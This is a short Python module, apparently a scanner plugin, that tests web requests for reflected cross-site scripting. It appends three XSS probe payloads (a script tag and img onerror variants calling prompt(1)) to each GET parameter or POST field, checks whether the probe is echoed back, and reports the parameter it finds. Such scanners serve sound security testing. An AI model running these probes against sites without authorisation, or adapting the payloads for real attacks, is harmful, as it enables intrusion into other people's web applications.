import  itertools,util
from http import Url, GetRequest, PostRequest
 
 
XSS_POCS = [u'<script>prompt(1)</script>', u'<img src=1 onerror=prompt(1)>', u'"><img src=1 onerror=prompt(1)>']
 

def  exploit(request):
    if not request.url.params and not request.fields:
        return
    if isinstance(request, GetRequest):
        for param, poc in itertools.product(request.url.params, XSS_POCS):
                req_tmp = request.copy()
                req_tmp.__class__ = GetRequest
                req_tmp.setParam(param, req_tmp.getParam(param)+poc)
                if poc in req_tmp.fetch():
                    #print  "xss vulnerability param:%s info:%s" % (param, req_tmp)
                    util.report({"type":"xss","content":util.json_encode({"xss_type":"GET","param":param,"detail":"%s" % req_tmp})})
                    break
    else:          
        for field, poc in itertools.product(request.fields, XSS_POCS):
            req_tmp = request.copy()
            req_tmp.__class__ = PostRequest
            req_tmp.setField(field, req_tmp.getField(field)+poc)
            if poc in req_tmp.fetch():
                #print  "xss vulnerability param:%s info:%s" % (field, req_tmp)
                util.report({"type":"xss","content":util.json_encode({"xss_type":"POST","field":field,"detail":"%s" % req_tmp})})
                break
